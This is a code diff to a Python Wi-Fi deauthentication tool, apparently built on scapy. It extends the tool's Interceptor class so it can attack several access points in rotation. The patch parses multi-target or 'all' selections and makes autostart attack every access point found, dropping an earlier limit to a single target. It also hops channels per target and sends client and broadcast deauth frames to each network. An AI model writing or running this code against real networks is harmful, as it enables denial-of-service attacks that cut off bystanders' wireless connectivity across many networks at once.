@@ -55,7 +55,7 @@ class Interceptor:
 
         self.attack_loop_count = 0
 
-        self.target_ssid: Union[SSID, None] = None
+        self._target_ssids: List[SSID] = list()
         self._debug_mode = debug_mode
 
         if not skip_monitor_mode_setup:
@@ -248,7 +248,7 @@ class Interceptor:
     def _custom_bssid_addr_is_set(self):
         return self._custom_bssid_addr is not None
 
-    def _start_initial_ap_scan(self) -> SSID:
+    def _start_initial_ap_scan(self) -> List[SSID]:
         self._scan_channels_for_aps()
         for band_ssids in self._all_ssids.values():
             for ssid_name, ssid_obj in band_ssids.items():
@@ -273,25 +273,38 @@ class Interceptor:
 
         printf(DELIM)
 
-        chosen = -1
+        chosen: Union[List[int], None] = None
         if self._autostart:
-            if len(target_map) > 1:
-                print_error(f"Cannot autostart!")
-                print_error(f"Found more than 1 access points, try better filters "
-                            f"(i.e 5GHz vs 2.4GHz, BSSID address...)")
-            else:
-                print_info("One target was found, autostart was set to True")
-                chosen = 1
+            chosen = list(target_map.keys())
+            print_info(f"Autostart was set to True, attacking all {len(chosen)} target(s) in rotation")
 
         # won't enter loop if autostart was set
-        while chosen not in target_map.keys():
-            user_input = print_input(f"Choose a target from {min(target_map.keys())} to {max(target_map.keys())}:")
-            try:
-                chosen = int(user_input)
-            except ValueError:
-                print_error("Wrong input! please enter an integer")
+        while chosen is None:
+            user_input = print_input(f"Choose targets from {min(target_map.keys())} to {max(target_map.keys())} "
+                                     f"(i.e -> 1,3,5 or 'all'):")
+            chosen = self._parse_targets_input(user_input, target_map)
 
-        return target_map[chosen]
+        return [target_map[idx] for idx in chosen]
+
+    @staticmethod
+    def _parse_targets_input(user_input: str, target_map: Dict[int, SSID]) -> Union[List[int], None]:
+        user_input = user_input.strip()
+        if user_input.lower() == 'all':
+            return list(target_map.keys())
+        try:
+            indices = sorted({int(tok) for tok in user_input.replace(' ', ',').split(',') if tok})
+        except ValueError:
+            print_error("Wrong input! please enter integers separated by commas (i.e -> 1,3,5) or 'all'")
+            return None
+        if not indices:
+            print_error("Empty selection, please choose at least one target")
+            return None
+        invalid = [idx for idx in indices if idx not in target_map]
+        if invalid:
+            print_error(f"Invalid target number(s) -> {invalid}, "
+                        f"choose from {min(target_map.keys())} to {max(target_map.keys())}")
+            return None
+        return indices
 
     def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
         return f"{ssid.ljust(Interceptor._SSID_STR_PAD - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(Interceptor._SSID_STR_PAD // 2, ' ')}{mcaddr}"
@@ -300,13 +313,15 @@ class Interceptor:
         try:
             if self._packet_confirms_client(pkt):
                 ap_mac = str(pkt.addr3)
-                if ap_mac == self.target_ssid.mac_addr:
-                    c_mac = pkt.addr1
-                    if c_mac not in [BD_MACADDR, self.target_ssid.mac_addr] and c_mac not in self.target_ssid.clients:
-                        self.target_ssid.clients.append(c_mac)
+                c_mac = pkt.addr1
+                for ssid in self._target_ssids:
+                    if ap_mac == ssid.mac_addr and c_mac not in [BD_MACADDR, ssid.mac_addr] \
+                            and c_mac not in ssid.clients:
+                        ssid.clients.append(c_mac)
                         add_to_target_list = len(self._custom_target_client_mac) == 0 or c_mac in self._custom_target_client_mac
                         with self._midrun_output_lck:
-                            self._midrun_output_buffer.append(f"Found new client {BOLD}{c_mac}{RESET},"
+                            self._midrun_output_buffer.append(f"Found new client {BOLD}{c_mac}{RESET} for "
+                                                              f"{BOLD}{ssid.name}{RESET},"
                                                               f" adding to target list -> "
                                                               f"{GREEN if add_to_target_list else RED}{add_to_target_list}{RESET}")
         except:
@@ -332,24 +347,28 @@ class Interceptor:
         print_info(f"Setting up a listener for new clients...")
         sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: Interceptor._ABORT is True)
 
-    def _get_target_clients(self) -> List[str]:
-        return self._custom_target_client_mac or self.target_ssid.clients
+    def _get_target_clients(self, ssid: SSID) -> List[str]:
+        return self._custom_target_client_mac or ssid.clients
 
     def _run_deauther(self):
         try:
             print_info(f"Starting de-auth loop...")
 
             failed_attempts_ctr = 0
-            ap_mac = self.target_ssid.mac_addr
             while not Interceptor._ABORT:
                 try:
                     if self._deauth_all_channels:
                         self._iter_next_channel()
                     self.attack_loop_count += 1
-                    for client_mac in self._get_target_clients():
-                        self._send_deauth_client(ap_mac, client_mac)
-                    if not self._custom_target_client_mac:
-                        self._send_deauth_broadcast(ap_mac)
+                    for ssid in self._target_ssids:
+                        # hop to the target's channel before attacking it (unless channel iteration is on)
+                        if not self._deauth_all_channels and self._current_channel_num != ssid.channel:
+                            self._set_channel(ssid.channel)
+                        ap_mac = ssid.mac_addr
+                        for client_mac in self._get_target_clients(ssid):
+                            self._send_deauth_client(ap_mac, client_mac)
+                        if not self._custom_target_client_mac:
+                            self._send_deauth_broadcast(ap_mac)
                     failed_attempts_ctr = 0  # reset counter
                 except Exception as exc:
                     failed_attempts_ctr += 1
@@ -376,11 +395,13 @@ class Interceptor:
               iface=self.interface)
 
     def run(self):
-        self.target_ssid = self._start_initial_ap_scan()
-        ssid_ch = self.target_ssid.channel
-        print_info(f"Attacking target {self.target_ssid.name}")
-        print_info(f"Setting channel -> {ssid_ch}")
-        self._set_channel(ssid_ch)
+        self._target_ssids = self._start_initial_ap_scan()
+        print_info(f"Attacking {len(self._target_ssids)} target(s) in rotation:")
+        for ssid in self._target_ssids:
+            print_info(f"  -> {BOLD}{ssid.name}{RESET} ({ssid.mac_addr}) on channel {ssid.channel}")
+        first_ch = self._target_ssids[0].channel
+        print_info(f"Setting channel -> {first_ch}")
+        self._set_channel(first_ch)
 
         printf(f"{DELIM}\n")
 
@@ -399,16 +420,30 @@ class Interceptor:
 
         while not Interceptor._ABORT:
             buffer_sz = self._print_midrun_output()
-            print_info(f"Target SSID{self.target_ssid.name.rjust(80 - 15, ' ')}")
-            print_info(f"Channel{str(self._current_channel_num).rjust(80 - 11, ' ')}")
-            print_info(f"MAC addr{self.target_ssid.mac_addr.rjust(80 - 12, ' ')}")
+            lines_printed = 0
+            if len(self._target_ssids) == 1:
+                ssid = self._target_ssids[0]
+                print_info(f"Target SSID{ssid.name.rjust(80 - 15, ' ')}")
+                print_info(f"Channel{str(self._current_channel_num).rjust(80 - 11, ' ')}")
+                print_info(f"MAC addr{ssid.mac_addr.rjust(80 - 12, ' ')}")
+                lines_printed += 3
+            else:
+                print_info(f"Targets ({len(self._target_ssids)}) in rotation")
+                lines_printed += 1
+                for ssid in self._target_ssids:
+                    print_info(f"  {ssid.name.ljust(Interceptor._SSID_STR_PAD - 8, ' ')}"
+                               f"{str(ssid.channel).ljust(5, ' ')}{ssid.mac_addr}")
+                    lines_printed += 1
+            total_clients = len(self._custom_target_client_mac) if self._custom_target_client_mac \
+                else sum(len(ssid.clients) for ssid in self._target_ssids)
             print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
-            print_info(f"Target clients{BOLD}{str(len(self._get_target_clients())).rjust(80 - 18, ' ')}{RESET}")
+            print_info(f"Target clients{BOLD}{str(total_clients).rjust(80 - 18, ' ')}{RESET}")
             print_info(f"Elapsed sec {BOLD}{str(get_time() - start).rjust(80 - 16, ' ')}{RESET}")
+            lines_printed += 3
             sleep(Interceptor._PRINT_STATS_INTV)
             if Interceptor._ABORT:  # might change while sleeping
                 break
-            clear_line(7 + buffer_sz)
+            clear_line(lines_printed + 1 + buffer_sz)
 
     def log_debug(self, msg: str):
         if self._debug_mode:
@@ -474,7 +509,7 @@ def main():
                         help='custom channels to scan / de-auth, separated by a comma (i.e -> 1,3,4)',
                         metavar="ch1,ch2", action='store', default=None, dest="custom_channels", required=False)
     parser.add_argument('-a', '--autostart',
-                        help='autostart the de-auth loop (if the scan result contains a single access point)',
+                        help='autostart the de-auth loop (attacks the single found AP, or all found APs in rotation)',
                         action='store_true', default=False, dest="autostart", required=False)
     parser.add_argument('-d', '--debug', help='enable debug prints',
                         action='store_true', default=False, dest="debug_mode", required=False)
